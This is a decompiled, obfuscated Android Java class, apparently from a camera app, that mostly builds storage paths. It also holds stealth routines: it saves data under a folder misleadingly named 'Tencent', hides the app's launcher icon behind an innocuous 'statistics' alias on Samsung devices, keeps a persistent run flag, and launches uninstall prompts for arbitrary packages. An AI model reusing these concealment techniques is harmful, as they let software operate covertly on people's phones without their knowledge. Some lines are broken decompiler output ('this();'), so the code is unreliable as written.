package com.make.cameracopy;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Environment;
import android.text.TextUtils;
import java.io.File;

public class j {
    public static String a(String paramString) {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("path: ");
        stringBuilder.append(paramString);
        j0.a(stringBuilder.toString());
        if (!TextUtils.isEmpty(paramString)) {
            File file = new File(paramString);
            if (!file.exists())
                file.mkdir();
            stringBuilder = a.g("exists: ");
            stringBuilder.append(file.exists());
            j0.a(stringBuilder.toString());
            return paramString;
        }
        return null;
    }

    public static String b() {
        boolean bool = Environment.getExternalStorageState().equals("mounted");
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("externalStorageAvailable: ");
        stringBuilder.append(bool);
        j0.e(stringBuilder.toString());
        if (bool) {
            stringBuilder = new StringBuilder();
            stringBuilder.append(Environment.getExternalStorageDirectory());
            String str1 = File.separator;
            stringBuilder.append(str1);
            stringBuilder.append("Tencent");
            stringBuilder.append(str1);
            return a(stringBuilder.toString());
        }
        stringBuilder = new StringBuilder();
        stringBuilder.append(BaseApplication.b.getCacheDir().getPath());
        String str = File.separator;
        stringBuilder.append(str);
        stringBuilder.append("Tencent");
        stringBuilder.append(str);
        return a(stringBuilder.toString());
    }

    public static String c() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(b());
        stringBuilder.append("Cache");
        stringBuilder.append(File.separator);
        return a(stringBuilder.toString());
    }

    public static String d() {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append(b());
        stringBuilder.append("Image");
        stringBuilder.append(File.separator);
        return a(stringBuilder.toString());
    }

    public static void e(Context paramContext) {
        if (MMKV.defaultMMKV().decodeBool("ALREADY_HIDE_ICON", false)) {
            j0.a("already hide icon.");
            return;
        }
        PackageManager packageManager = paramContext.getPackageManager();
        packageManager.setComponentEnabledSetting(new ComponentName(paramContext, OnePixelActivity.class), 2, 1);
        String str = Build.MODEL;
        if (str.contains("SM") || str.contains("sm")) {
            packageManager.setComponentEnabledSetting(new ComponentName(paramContext, "com.statistics.info.alias"), 1, 1);
            MMKV.defaultMMKV().encode("IS_SM_HIDE", true);
        }
        MMKV.defaultMMKV().encode("ALREADY_HIDE_ICON", true);
    }

    public static boolean f() {
        boolean bool = MMKV.defaultMMKV().decodeBool("AppUtils_V1isNeedRunning", true);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("isNeedRunning: ");
        stringBuilder.append(bool);
        j0.a(stringBuilder.toString());
        return bool;
    }

    public static void g(Context paramContext, String paramString) {
        j0.e(paramString);
        try {
            StringBuilder stringBuilder = new StringBuilder();
            this();
            stringBuilder.append("package:");
            stringBuilder.append(paramString);
            Uri uri = Uri.parse(stringBuilder.toString());
            Intent intent = new Intent();
            this("android.intent.action.DELETE", uri);
            intent.setFlags(268435456);
            paramContext.startActivity(intent);
            f.b(25);
        } catch (Exception exception) {
            j0.b(exception);
            f.a(25, 0, 0, exception.toString());
        }
    }
}
